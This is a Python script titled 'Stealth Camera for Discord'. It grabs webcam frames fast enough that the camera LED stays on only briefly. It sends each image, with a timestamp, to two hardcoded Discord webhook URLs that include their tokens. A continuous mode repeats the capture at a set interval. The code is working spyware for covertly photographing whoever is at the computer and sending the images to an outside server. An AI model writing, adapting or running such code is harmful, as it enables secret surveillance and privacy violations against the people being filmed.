import cv2
import requests
from io import BytesIO
import time
from datetime import datetime
import threading
import sys

# Discord webhooks
DISCORD_WEBHOOKS = [
    "https://discordapp.com/api/webhooks/1464318526650187836/JVj45KwndFltWM8WZeD3z9e0dlIipcbyQN7Fu_iAt5HpBn1O5f4t_r43koMeX3Dv73gF",
    "https://discord.com/api/webhooks/1464318888714961091/dElHOxtS91PyvPZR3DQRcSNzD0di6vIlTr3qfHs-DUSEutmHxF9jEPJ7BMrWwhthbLf0"
]

# Windows compatibility: remove Unicode emojis for Windows console
IS_WINDOWS = sys.platform.startswith('win')

class StealthCamera:
    def __init__(self):
        self.camera = None
        self.last_capture = None
        
    def quick_capture(self):
        """Ultra-fast capture to minimize camera LED time."""
        try:
            # Open camera with minimal settings
            self.camera = cv2.VideoCapture(0)
            
            if not self.camera.isOpened():
                print("Error: Could not open camera.")
                return None
            
            # Set to lowest resolution for speed
            self.camera.set(cv2.CAP_PROP_FRAME_WIDTH, 320)
            self.camera.set(cv2.CAP_PROP_FRAME_HEIGHT, 240)
            
            # Disable autofocus for speed (if available)
            self.camera.set(cv2.CAP_PROP_AUTOFOCUS, 0)
            
            # Grab a few frames to let camera adjust quickly
            for _ in range(3):
                self.camera.grab()
            
            # Capture frame - LED will activate here
            ret, frame = self.camera.read()
            
            # Release camera IMMEDIATELY - LED should turn off
            self.camera.release()
            self.camera = None
            
            if not ret:
                print("Error: Could not capture image.")
                return None
            
            return frame
            
        except Exception as e:
            print(f"Capture error: {e}")
            if self.camera:
                self.camera.release()
                self.camera = None
            return None
    
    def capture_with_prewarm(self, warm_frames=10):
        """
        Alternative: Pre-warm camera in background thread,
        then capture quickly.
        """
        def prewarm_camera():
            """Open and close camera quickly to pre-warm."""
            try:
                cam = cv2.VideoCapture(0)
                if cam.isOpened():
                    # Set low resolution
                    cam.set(cv2.CAP_PROP_FRAME_WIDTH, 320)
                    cam.set(cv2.CAP_PROP_FRAME_HEIGHT, 240)
                    
                    # Grab frames without reading
                    for _ in range(warm_frames):
                        cam.grab()
                    
                    cam.release()
            except:
                pass
        
        # Start pre-warming in background
        prewarm_thread = threading.Thread(target=prewarm_camera)
        prewarm_thread.daemon = True
        prewarm_thread.start()
        
        # Wait a moment
        time.sleep(0.1)
        
        # Now do the actual capture
        return self.quick_capture()

def send_to_discord(image, webhook_url, message=None):
    """Send image to a Discord webhook."""
    if image is None:
        return False
        
    # Encode image to JPEG format in memory
    ret, buffer = cv2.imencode('.jpg', image, [cv2.IMWRITE_JPEG_QUALITY, 85])
    
    if not ret:
        print("Error: Could not encode image.")
        return False
    
    # Create a BytesIO object from the buffer
    image_bytes = BytesIO(buffer.tobytes())
    
    # Prepare files for Discord
    files = {
        'file': ('camera_image.jpg', image_bytes, 'image/jpeg')
    }
    
    # Prepare data (optional message)
    data = {}
    if message:
        data['content'] = message
    
    try:
        response = requests.post(webhook_url, files=files, data=data)
        
        if response.status_code == 204:
            print("Success: Image sent to Discord!")
            return True
        elif response.status_code == 429:
            print("Warning: Rate limited. Waiting before retry...")
            time.sleep(5)
            return False
        else:
            print(f"Error sending to Discord: Status {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")
        return False

def stealth_capture_and_send():
    """Capture and send with minimal camera activation."""
    print("Stealth capture in progress...")
    
    camera = StealthCamera()
    
    # Method 1: Quickest capture (LED on for shortest time)
    print("Quick capture...")
    image = camera.quick_capture()
    
    if image is None:
        print("Failed to capture image.")
        return
    
    # Create timestamp message
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    message = f"Stealth capture at {timestamp}"
    
    # Send to all webhooks
    success_count = 0
    for i, webhook_url in enumerate(DISCORD_WEBHOOKS, 1):
        print(f"Sending to webhook {i}...")
        if send_to_discord(image, webhook_url, message):
            success_count += 1
        # Small delay to avoid rate limiting
        time.sleep(0.5)
    
    print(f"Successfully sent to {success_count}/{len(DISCORD_WEBHOOKS)} webhooks.")

def continuous_stealth_capture(interval_seconds=30):
    """Continuous stealth captures."""
    print("Starting continuous stealth mode...")
    print("Note: Camera LED will flash briefly for each capture")
    print(f"Interval: {interval_seconds} seconds")
    print("Press Ctrl+C to stop\n")
    
    camera = StealthCamera()
    capture_count = 0
    
    try:
        while True:
            capture_count += 1
            print(f"\nCapture #{capture_count} at {datetime.now().strftime('%H:%M:%S')}")
            
            image = camera.quick_capture()
            
            if image is not None:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                message = f"Auto capture #{capture_count} at {timestamp}"
                
                for i, webhook_url in enumerate(DISCORD_WEBHOOKS, 1):
                    print(f"Sending to webhook {i}...")
                    send_to_discord(image, webhook_url, message)
                    time.sleep(0.5)
            else:
                print("Failed to capture image")
            
            # Wait for next capture
            if interval_seconds > 1:
                print(f"Waiting {interval_seconds} seconds...")
                # Countdown display for longer intervals
                if interval_seconds > 10:
                    for remaining in range(interval_seconds, 0, -1):
                        print(f"Next capture in: {remaining}s", end='\r')
                        time.sleep(1)
                    print()
                else:
                    time.sleep(interval_seconds)
            else:
                time.sleep(interval_seconds)
                
    except KeyboardInterrupt:
        print("\nStopped by user.")
        print(f"Total captures: {capture_count}")
    except Exception as e:
        print(f"Unexpected error: {e}")

def single_capture_mode():
    """Simple single capture mode."""
    print("Single capture mode")
    print("=" * 40)
    
    stealth_capture_and_send()

def test_camera():
    """Test camera functionality."""
    print("Testing camera...")
    
    # Try different camera indices
    for i in range(0, 3):
        cap = cv2.VideoCapture(i)
        if cap.isOpened():
            print(f"Camera found at index {i}")
            ret, frame = cap.read()
            if ret:
                print(f"Successfully captured test image: {frame.shape[1]}x{frame.shape[0]}")
            cap.release()
            return True
        cap.release()
    
    print("No camera found. Please check your camera connection.")
    return False

if __name__ == "__main__":
    # Install required packages: pip install opencv-python requests
    
    print("=" * 50)
    print("Stealth Camera for Discord")
    print("=" * 50)
    print("Note: Camera LED cannot be disabled via software")
    print("This script minimizes LED activation time")
    print("-" * 50)
    
    # Test camera first
    if not test_camera():
        exit(1)
    
    # Choose mode
    print("\nSelect mode:")
    print("1. Single stealth capture")
    print("2. Continuous stealth mode")
    print("3. Test mode (capture and preview)")
    print("4. Exit")
    
    try:
        choice = input("Enter choice (1-4): ").strip()
        
        if choice == '1':
            single_capture_mode()
            
        elif choice == '2':
            try:
                interval = int(input("Enter interval in seconds (default: 30, min: 5): ") or "30")
                if interval < 5:
                    print("Warning: Intervals less than 5 seconds may cause issues")
                    confirm = input("Continue? (y/n): ").lower()
                    if confirm != 'y':
                        print("Exiting...")
                        exit()
            except ValueError:
                interval = 30
                print(f"Using default interval: {interval} seconds")
            
            continuous_stealth_capture(interval)
            
        elif choice == '3':
            print("\nTest mode - Preview only (no Discord)")
            camera = StealthCamera()
            image = camera.quick_capture()
            
            if image is not None:
                print(f"Image captured: {image.shape[1]}x{image.shape[0]}")
                
                # Show preview
                cv2.imshow('Preview (Press any key to close)', image)
                cv2.waitKey(0)
                cv2.destroyAllWindows()
                
                save = input("Save image to disk? (y/n): ").lower()
                if save == 'y':
                    filename = f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                    cv2.imwrite(filename, image)
                    print(f"Image saved as {filename}")
            else:
                print("Failed to capture image")
                
        elif choice == '4':
            print("Exiting...")
            
        else:
            print("Invalid choice.")
            
    except KeyboardInterrupt:
        print("\nCancelled by user.")
    except Exception as e:
        print(f"Error: {e}")
    
    print("\nScript completed.")
